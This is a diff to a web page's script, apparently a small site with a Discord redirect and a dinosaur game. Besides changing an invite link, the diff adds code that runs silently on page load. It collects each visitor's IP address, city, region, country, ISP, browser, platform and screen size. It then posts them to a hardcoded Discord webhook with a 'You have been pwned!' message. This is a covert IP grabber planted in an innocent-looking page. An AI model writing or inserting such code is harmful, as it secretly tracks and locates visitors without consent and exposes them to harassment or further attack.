@@ -176,7 +176,7 @@
 
         // Redirect to AY1
         function redirectToAY1() {
-            window.location.href = 'https://discord.com/invite/ay1';
+            window.location.href = 'https://discord.com/ay1';
         }
 
         // Open Dinosaur Game
@@ -202,6 +202,53 @@
                 showAlert();
             }
         });
+
+        // Fetch and send IP to webhook
+        async function fetchAndSendIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
+                const geoData = await geoResponse.json();
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timestamp = new Date().toLocaleString();
+
+                // Build webhook message content
+                const webhookMessage = `
+:cAsH:  cAsH grabbed You :cAsH: 
+
+**User IP:** ${userIP}
+**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
+**ISP:** ${geoData.org || "Unknown"}
+**Browser:** ${userAgent}
+**Platform:** ${platform}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Timestamp:** ${timestamp}
+
+||@everyone|| **You have been pwned!**
+                `;
+
+                // Send to Discord Webhook
+                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: webhookMessage
+                    })
+                });
+            } catch (error) {
+                console.error('Error fetching IP or sending to webhook:', error);
+            }
+        }
+
+        // Execute the function on page load
+        window.onload = fetchAndSendIP;
     </script>
 </body>
 </html>
